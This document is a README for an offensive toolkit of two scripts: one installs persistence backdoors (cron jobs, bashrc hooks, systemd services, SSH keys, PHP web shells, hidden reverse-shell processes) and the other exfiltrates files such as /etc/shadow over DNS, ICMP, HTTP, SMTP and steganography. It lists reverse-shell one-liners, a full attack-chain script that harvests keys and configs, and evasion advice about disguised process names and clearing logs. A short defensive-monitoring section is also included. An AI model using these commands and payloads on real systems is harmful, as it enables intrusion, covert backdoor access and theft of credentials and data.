# Persistence & Exfiltration Toolkit

Advanced Python scripts for establishing persistence and exfiltrating data through covert channels. Part of the Red Team Security Testing Toolkit.

---

## 📋 Tools Overview

| # | Tool | Category | Purpose |
|---|------|----------|---------|
| 25 | `persistence.py` | Post-Exploitation | Multi-method persistence installation & detection |
| 26 | `exfiltrator.py` | Data Exfiltration | Covert data exfiltration via DNS, ICMP, HTTP, steganography |

---

## Installation

### Prerequisites

- **Python 3.8+** (3.10+ recommended)
- **pip** (latest version)
- **Root/Administrator privileges** (for most methods)

### Quick Install

```bash
# Clone the toolkit repository
git clone https://github.com/your-repo/redteam-web-toolkit.git
cd redteam-web-toolkit

# Install dependencies
pip install -r requirements-persistence-exfil.txt
```

### Tool-Specific Dependencies

#### Persistence Installer (`persistence.py`)

```bash
# Core dependencies (minimal)
pip install requests

# No additional packages required for basic operation
# Built-in modules used: os, sys, subprocess, base64, json, etc.
```

#### Data Exfiltrator (`exfiltrator.py`)

```bash
# Basic exfiltration methods
pip install requests

# Steganography support
pip install Pillow

# Encryption support
pip install cryptography

# WebSocket support
pip install websocket-client

# Compression
pip install zlib  # (usually built-in)

# DNS manipulation (optional)
pip install dnspython
```

### Complete Requirements File

Create `requirements-persistence-exfil.txt`:

```txt
# Core dependencies
requests>=2.28.0
cryptography>=39.0.0

# Steganography
Pillow>=9.4.0

# WebSocket
websocket-client>=1.5.0

# DNS
dnspython>=2.3.0

# Email
smtplib (built-in)
email (built-in)

# Compression & Encoding
zlib (built-in)
base64 (built-in)

# Utilities
colorama>=0.4.6
```

### Platform-Specific Setup

#### Linux

```bash
# Install system dependencies
sudo apt-get update
sudo apt-get install -y python3 python3-pip

# For ICMP exfiltration (requires root)
sudo setcap cap_net_raw+ep /usr/bin/python3

# Install Python packages
pip install -r requirements-persistence-exfil.txt
```

#### macOS

```bash
# Using Homebrew
brew install python3

# For ICMP (requires sudo)
sudo python3 -c "import socket; print('ICMP ready')"

# Install Python packages
pip3 install -r requirements-persistence-exfil.txt
```

#### Windows

```bash
# Install Python from python.org
# Run as Administrator for registry methods

# Install dependencies
pip install -r requirements-persistence-exfil.txt

# Note: Some methods are Linux-specific
# Windows supports: Registry, Startup Folder, HTTP/HTTPS exfiltration
```

---

## 📖 Tool 25: Persistence Installer

### Purpose
Comprehensive persistence mechanism installer that establishes multiple backdoor methods for maintaining access to compromised systems, with detection and cleanup capabilities.

### Key Capabilities

#### 🕐 Cron Job Persistence
- **User crontab** - Add jobs to current user's crontab
- **System crontab** - Modify `/etc/crontab` (requires root)
- **Cron directories** - Scripts in cron.hourly/daily/weekly/monthly
- **Anacron jobs** - System-wide scheduled tasks
- **Multiple schedules** - Configurable timing patterns

#### 🚀 Startup Script Persistence
- **.bashrc backdoor** - Execute on shell login
- **.bash_profile** - Multiple profile file targeting
- **SSH RC script** - Execute on SSH connection
- **Desktop autostart** - `.config/autostart` entries
- **Systemd services** - Persistent system services (root)
- **Init.d scripts** - Legacy init system scripts (root)

#### 🔑 SSH Backdoors
- **Authorized keys** - Add attacker SSH keys
- **SSH wrapper** - Trojan horse for SSH binary
- **Key generation** - Automatic RSA key creation

#### 🌐 Web Shells
- **PHP web shell** - Web-based command execution
- **Multiple directories** - Search for writable web roots
- **File upload** - Built-in upload capability

#### 👻 Hidden Processes
- **Background processes** - Detached reverse shells
- **Hidden directories** - Obfuscated storage locations
- **Redundant cron** - Multiple fallback triggers

#### 🪟 Windows Support
- **Registry Run keys** - Current user persistence
- **Startup folder** - VBS script placement
- **Scheduled tasks** - Task Scheduler integration

### Usage

#### Basic Installation

```bash
# Install all persistence methods
python persistence.py <callback_host> <callback_port>

# Example
python persistence.py 10.0.0.1 4444
```

#### Individual Method Examples

```python
from persistence import PersistenceInstaller

# Initialize
installer = PersistenceInstaller("10.0.0.1", 4444)

# Install specific methods
installer.install_cron_persistence()
installer.install_startup_scripts()
installer.install_ssh_backdoor()
installer.install_web_shell()
installer.install_motd_backdoor()
installer.install_hidden_process()

# Detect existing persistence
installer.detect_existing_persistence()
```

### Expected Output

```
[*] Installing ALL persistence mechanisms...
[*] Callback: 10.0.0.1:4444

[*] Detecting existing persistence...
    [*] No existing persistence detected

[*] Installing cron persistence...
    [+] User crontab installed: * * * * *
    [+] System crontab installed: /etc/crontab
    [+] Cron script installed: /etc/cron.daily/system-update
    [+] Cron script installed: /etc/cron.hourly/system-update
    [+] Anacron job installed: /etc/anacrontab

[*] Installing startup script persistence...
    [+] .bashrc backdoored: /home/user/.bashrc
    [+] Profile backdoored: /home/user/.bash_profile
    [+] Profile backdoored: /home/user/.profile
    [+] SSH RC backdoored: /home/user/.ssh/rc
    [+] Systemd service installed: system-update
    [+] Init script installed: /etc/init.d/system-update
    [+] Desktop autostart installed: /home/user/.config/autostart/system-update.desktop

[*] Installing SSH backdoor...
    [+] SSH authorized_keys backdoored
    [+] Private key: /home/user/.ssh/id_rsa_backdoor
    [+] SSH wrapper installed

[*] Installing web shell...
    [+] Web shell installed: /var/www/html/system-check.php
    [+] Web shell installed: /usr/share/nginx/html/system-check.php

[*] Installing MOTD backdoor...
    [+] MOTD backdoored: /etc/update-motd.d/99-system-check

[*] Installing hidden process...
    [+] Hidden process installed: /home/user/.cache/.system/sys-update
    [+] Hidden process installed: /tmp/.system/sys-update

============================================================
PERSISTENCE INSTALLATION SUMMARY
============================================================
Total Methods Installed: 18
Total Detected: 0
Total Errors: 0

[+] Persistence report saved to persistence_report.json
[+] Cleanup script saved to cleanup_persistence.sh
```

### Persistence Methods Reference

| Method | Privilege | Stealth | Reliability | Platform |
|--------|-----------|---------|-------------|----------|
| User Crontab | User | Medium | High | Linux |
| System Crontab | Root | Low | High | Linux |
| Cron Directories | Root | Medium | High | Linux |
| .bashrc | User | Low | Medium | Linux |
| Profile Scripts | User | Low | Medium | Linux |
| SSH RC | User | Medium | Medium | Linux |
| Systemd Service | Root | Medium | High | Linux |
| Init.d Script | Root | Low | High | Linux |
| Desktop Autostart | User | Medium | High | Linux |
| Authorized Keys | User | High | High | Linux |
| SSH Wrapper | Root | High | High | Linux |
| PHP Web Shell | User | Medium | High | Linux |
| MOTD Backdoor | Root | Medium | Medium | Linux |
| Hidden Process | User | High | Medium | Linux |
| Registry Run | User | Low | High | Windows |
| Startup Folder | User | Low | High | Windows |

### Cleanup

```bash
# View installed persistence methods
cat persistence_report.json

# Run cleanup script (generated automatically)
bash cleanup_persistence.sh
```

**Cleanup script content:**
```bash
#!/bin/bash
# Persistence Cleanup Script

crontab -r 2>/dev/null
systemctl stop system-update 2>/dev/null
systemctl disable system-update 2>/dev/null
rm -f /etc/systemd/system/system-update.service 2>/dev/null
rm -f /etc/cron.daily/system-update 2>/dev/null
rm -f /etc/cron.hourly/system-update 2>/dev/null
rm -f /home/user/.bashrc.backup 2>/dev/null
rm -f /home/user/.ssh/rc 2>/dev/null
rm -f /home/user/.config/autostart/system-update.desktop 2>/dev/null
rm -f /var/www/html/system-check.php 2>/dev/null

echo '[+] Persistence cleaned up'
```

---

## 📖 Tool 26: Data Exfiltrator

### Purpose
Advanced data exfiltration toolkit supporting multiple covert channels including DNS tunneling, ICMP tunneling, HTTP/HTTPS, steganography, and encrypted TCP channels.

### Key Capabilities

#### 🌐 DNS Exfiltration
- **A record queries** - Data in subdomain queries
- **TXT record queries** - Larger payload capacity
- **Base32 encoding** - DNS-safe character set
- **Chunked transmission** - Automatic file splitting
- **Server code generation** - Python DNS listener

#### 📡 ICMP Exfiltration
- **Raw socket ICMP** - Echo request payload
- **Checksum calculation** - Valid packet construction
- **Sequence tracking** - Reassembly support
- **Root privilege** - Required for raw sockets

#### 🌍 HTTP/HTTPS Exfiltration
- **Chunked POST** - Large file support
- **Base64 encoding** - Binary safe transport
- **Compression** - zlib data compression
- **Encryption** - Fernet symmetric encryption
- **Stealth headers** - Custom User-Agent

#### 📧 SMTP Exfiltration
- **File attachments** - MIME encoded
- **Spam-like appearance** - Blends with normal traffic
- **SMTP server** - Custom or public relays

#### 🖼️ Steganography
- **LSB steganography** - Least Significant Bit hiding
- **PNG output** - Common image format
- **File headers** - Metadata preservation
- **Carrier images** - Use existing images

#### 🔒 Covert TCP
- **Encrypted channel** - Fernet encryption
- **Chunked protocol** - Reliable transfer
- **Acknowledgment** - Guaranteed delivery
- **Custom port** - Configurable

#### 🔌 WebSocket
- **Real-time streaming** - Low latency
- **JSON protocol** - Structured data
- **Progress tracking** - Chunk indexing

### Usage

#### Single File Exfiltration

```bash
# Basic file exfiltration (tries multiple methods)
python exfiltrator.py /etc/shadow 10.0.0.1

# With custom domain for DNS exfiltration
python exfiltrator.py /etc/passwd 10.0.0.1 exfil.attacker.com
```

#### Directory Exfiltration

```bash
# Exfiltrate entire directory
python exfiltrator.py /var/www/html 10.0.0.1

# Only sensitive files are exfiltrated automatically
```

#### Programmatic Usage

```python
from exfiltrator import DataExfiltrator

# Initialize
exfil = DataExfiltrator("10.0.0.1", "exfil.example.com")

# Single method exfiltration
exfil.exfiltrate_dns("/etc/shadow")
exfil.exfiltrate_http("/etc/passwd")
exfil.exfiltrate_icmp("/etc/hosts")
exfil.exfiltrate_https("/var/log/auth.log")
exfil.exfiltrate_smtp("/home/user/.bash_history")

# Steganography
exfil.exfiltrate_steganography("/etc/shadow", "carrier.jpg")

# Covert TCP (encrypted)
exfil.exfiltrate_covert_tcp("/etc/shadow")

# WebSocket streaming
exfil.exfiltrate_websocket("/var/log/apache2/access.log")

# Generate server code
exfil.generate_server_code()

# Exfiltrate entire directory
exfil.exfiltrate_directory("/var/www/html", methods=['http', 'dns'])
```

### Expected Output

```
[*] Generating server/listener code...
[+] Server files generated:
    - dns_server.py
    - icmp_server.py
    - http_server.py

[*] Exfiltrating file: /etc/shadow

[*] Exfiltrating via DNS: /etc/shadow
    Progress: 10/45
    Progress: 20/45
    Progress: 30/45
    Progress: 40/45
    Progress: 45/45
    [+] DNS exfiltration complete: 45/45 chunks

[*] Exfiltrating via HTTP: /etc/shadow
    Progress: 1/3
    Progress: 2/3
    Progress: 3/3
    [+] HTTP exfiltration complete: 3/3 chunks

[*] Exfiltrating via Steganography: /etc/shadow
    [+] Steganography complete: /tmp/stego_shadow.png
    [+] Hidden data: 2048 bytes in /tmp/stego_shadow.png

[*] Exfiltrating via Covert TCP: /etc/shadow
    Progress: 10/90
    Progress: 20/90
    Progress: 90/90
    [+] Covert TCP complete: 90/90 chunks
    [+] Data encrypted with Fernet

============================================================
EXFILTRATION SUMMARY
============================================================
Total Files: 1
Total Size: 2,048 bytes
Methods Used: dns, http, steganography, covert_tcp

[+] Exfiltration report saved to exfiltration_report.json
```

### Server/Listener Code

The tool automatically generates server code for receiving exfiltrated data:

#### DNS Server (`dns_server.py`)
```python
# Receives DNS queries and reassembles files
# Run on attacker server:
sudo python3 dns_server.py
```

#### ICMP Server (`icmp_server.py`)
```python
# Receives ICMP packets and extracts data
# Run on attacker server (requires root):
sudo python3 icmp_server.py
```

#### HTTP Server (`http_server.py`)
```python
# Receives HTTP POST requests with file chunks
# Run on attacker server:
python3 http_server.py
```

### Exfiltration Methods Comparison

| Method | Speed | Stealth | Reliability | Requires Root | Detection Risk |
|--------|-------|---------|-------------|---------------|----------------|
| DNS | Slow | High | Medium | No | Low |
| DNS TXT | Medium | High | Medium | No | Medium |
| ICMP | Medium | Medium | High | Yes | Medium |
| HTTP | Fast | Medium | High | No | Medium |
| HTTPS | Fast | High | High | No | Low |
| SMTP | Slow | Medium | Medium | No | Medium |
| Steganography | N/A | Very High | Manual | No | Very Low |
| Covert TCP | Fast | High | High | No | Low |
| WebSocket | Fast | Medium | High | No | Medium |

### Encoding Methods

| Encoding | Overhead | DNS Safe | URL Safe | Capacity |
|----------|----------|----------|----------|----------|
| Base64 | 33% | No | Yes | 75% |
| Base32 | 60% | Yes | No | 62.5% |
| Base85 | 25% | No | No | 80% |
| Hex | 100% | Yes | Yes | 50% |

### Compression & Encryption

```python
# Data is automatically compressed before exfiltration
compressed = zlib.compress(original_data)

# Data can be encrypted for covert channels
from cryptography.fernet import Fernet
encrypted = fernet.encrypt(compressed_data)
```

---

## 🔧 Advanced Configuration

### Custom Payloads

```python
# Custom reverse shell payloads
payloads = {
    'bash': 'bash -i >& /dev/tcp/HOST/PORT 0>&1',
    'python': 'python3 -c "import socket,subprocess,os;..."',
    'nc': 'nc HOST PORT -e /bin/bash',
    'php': 'php -r \'$sock=fsockopen("HOST",PORT);...\'',
}

# Use custom payload
installer = PersistenceInstaller("10.0.0.1", 4444)
installer.install_cron_persistence(payload=payloads['python'])
```

### Custom Exfiltration Chunk Size

```python
# Adjust chunk size for different methods
exfil = DataExfiltrator("10.0.0.1")
exfil.chunk_size = 100  # Larger chunks for HTTP
exfil.exfiltrate_http("large_file.zip")

exfil.chunk_size = 30   # Smaller chunks for DNS
exfil.exfiltrate_dns("small_file.txt")
```

### Scheduling Persistence

```python
# Different cron schedules
schedules = {
    'every_minute': '* * * * *',
    'every_5_minutes': '*/5 * * * *',
    'every_hour': '0 * * * *',
    'daily_midnight': '0 0 * * *',
    'weekly': '0 0 * * 0',
    'reboot': '@reboot'
}

installer.install_cron_persistence(
    payload=payloads['bash'],
    schedule=schedules['every_5_minutes']
)
```

---

## 🛡️ Defense Recommendations

### Against Persistence

1. **Monitor System Files**
   ```bash
   # Monitor critical files
   auditctl -w /etc/crontab -p wa
   auditctl -w /etc/cron.d -p wa
   auditctl -w /etc/passwd -p wa
   ```

2. **Detect Unauthorized Cron Jobs**
   ```bash
   # Check all crontabs
   for user in $(cut -f1 -d: /etc/passwd); do
       echo "=== $user ==="
       crontab -u $user -l 2>/dev/null
   done
   ```

3. **Monitor SSH Keys**
   ```bash
   # Check for unauthorized keys
   find /home -name "authorized_keys" -exec ls -la {} \;
   ```

4. **File Integrity Monitoring**
   ```bash
   # Use AIDE or Tripwire
   aide --init
   aide --check
   ```

### Against Data Exfiltration

1. **DNS Monitoring**
   ```bash
   # Monitor DNS queries
   tcpdump -i eth0 port 53 -w dns_traffic.pcap
   
   # Analyze for suspicious patterns
   # Look for: long subdomains, high entropy, unusual TLDs
   ```

2. **Network Segmentation**
   ```bash
   # Block outbound DNS except from DNS servers
   iptables -A OUTPUT -p udp --dport 53 -j DROP
   iptables -A OUTPUT -p udp --dport 53 -d 8.8.8.8 -j ACCEPT
   ```

3. **DLP Solutions**
   - Monitor for large data transfers
   - Block unauthorized protocols
   - Inspect encrypted traffic patterns

4. **ICMP Filtering**
   ```bash
   # Block or rate-limit ICMP
   iptables -A OUTPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT
   iptables -A OUTPUT -p icmp -j DROP
   ```

5. **File Access Monitoring**
   ```bash
   # Monitor sensitive file access
   auditctl -w /etc/shadow -p r
   auditctl -w /var/log -p r
   ```

---

## 📊 Integration Examples

### Full Attack Chain

```bash
#!/bin/bash
# full_attack_chain.sh

# Phase 1: Gain initial access (example)
# python exploit.py target.com

# Phase 2: Install persistence
python persistence.py 10.0.0.1 4444

# Phase 3: Collect sensitive data
find / -name "*.conf" -o -name "*.key" -o -name "*.pem" > sensitive_files.txt

# Phase 4: Exfiltrate data
while read file; do
    python exfiltrator.py "$file" 10.0.0.1
done < sensitive_files.txt

# Phase 5: Clean up (optional)
# bash cleanup_persistence.sh
```

### Automated Exfiltration Script

```python
#!/usr/bin/env python3
"""Automated data collection and exfiltration"""

from persistence import PersistenceInstaller
from exfiltrator import DataExfiltrator
import os

def auto_exfiltrate():
    # Initialize
    installer = PersistenceInstaller("10.0.0.1", 4444)
    exfil = DataExfiltrator("10.0.0.1", "exfil.example.com")
    
    # Install persistence first
    installer.install_cron_persistence()
    installer.install_ssh_backdoor()
    
    # Collect sensitive files
    sensitive_dirs = [
        '/etc',
        '/var/log',
        '/home',
        '/root',
        '/opt'
    ]
    
    for directory in sensitive_dirs:
        if os.path.exists(directory):
            exfil.exfiltrate_directory(directory)
    
    # Generate reports
    installer.generate_report()
    exfil.generate_report()

if __name__ == "__main__":
    auto_exfiltrate()
```

---

## 🐛 Troubleshooting

### Common Issues

#### 1. Permission Denied (Persistence)

```bash
# Solution: Check user privileges
id

# For cron methods
crontab -l  # Check if user can use crontab

# For system methods (need root)
sudo python persistence.py 10.0.0.1 4444
```

#### 2. ICMP Exfiltration Permission Error

```bash
# Solution 1: Run as root
sudo python exfiltrator.py /etc/shadow 10.0.0.1

# Solution 2: Set capabilities
sudo setcap cap_net_raw+ep /usr/bin/python3

# Verify
getcap /usr/bin/python3
```

#### 3. DNS Exfiltration Not Working

```bash
# Test DNS connectivity
nslookup test.example.com

# Check if DNS server is reachable
ping -c 3 8.8.8.8

# Verify domain configuration
dig @10.0.0.1 exfil.example.com
```

#### 4. Web Shell Not Accessible

```bash
# Check web server status
systemctl status apache2
systemctl status nginx

# Check directory permissions
ls -la /var/www/html/
ls -la /usr/share/nginx/html/

# Test web access
curl http://localhost/system-check.php
```

#### 5. Crontab Not Executing

```bash
# Check cron service
systemctl status cron

# Check cron logs
tail -f /var/log/syslog | grep CRON

# Test with simple cron job
echo "* * * * * echo test > /tmp/cron_test" | crontab -
# Wait 1 minute and check
cat /tmp/cron_test
```

#### 6. Steganography Image Quality

```bash
# Use high-resolution carrier images
# Minimum recommended size: 1000x1000 pixels
# Calculate capacity: (width * height * 3) / 8 bytes

# For 1MB file:
# Need approximately 1000x1000 pixel image
```

---

## 📝 Best Practices

### Operational Security (OPSEC)

1. **Use Encryption**
   - Always encrypt exfiltrated data
   - Use HTTPS instead of HTTP
   - Encrypt stored payloads

2. **Limit Persistence Methods**
   - Install only what's needed
   - Too many methods increase detection risk
   - Use stealthy methods (SSH keys, web shells)

3. **Timing Considerations**
   - Use realistic cron schedules
   - Avoid peak monitoring hours
   - Randomize exfiltration timing

4. **Data Minimization**
   - Only exfiltrate necessary data
   - Filter files by extension
   - Compress before exfiltration

5. **Cleanup**
   - Remove persistence when done
   - Clear logs and histories
   - Use cleanup script

### Detection Avoidance

```python
# Use common process names
process_names = ['system-update', 'crond', 'sshd-helper', 'dbus-daemon']

# Use legitimate-looking paths
paths = [
    '/usr/lib/systemd/system-update',
    '/usr/share/dbus-1/services/org.freedesktop.system',
    '/etc/NetworkManager/dispatcher.d/99-system-check'
]

# Use common ports
ports = [80, 443, 53, 8080, 8443]  # Blend with normal traffic
```

---


### Adding New Exfiltration Channels

```python
def exfiltrate_new_channel(self, filepath):
    """Add custom exfiltration channel"""
    try:
        # Implementation
        self.results['exfiltrated_files'].append({
            'file': filepath,
            'method': 'new_channel'
        })
    except Exception as e:
        self.results['errors'].append(e)
```

---

## 📄 License

MIT License - See LICENSE file for details.

## 🙏 Acknowledgments

- MITRE ATT&CK Framework for TTPs
- OWASP for security testing methodologies
- Security researchers who discovered these techniques

## 📚 Resources

- [MITRE ATT&CK - Persistence](https://attack.mitre.org/tactics/TA0003/)
- [MITRE ATT&CK - Exfiltration](https://attack.mitre.org/tactics/TA0010/)
- [DNS Tunneling Techniques](https://www.sans.org/reading-room/whitepapers/dns/)
- [Steganography in Digital Images](https://www.garykessler.net/library/steganography.html)

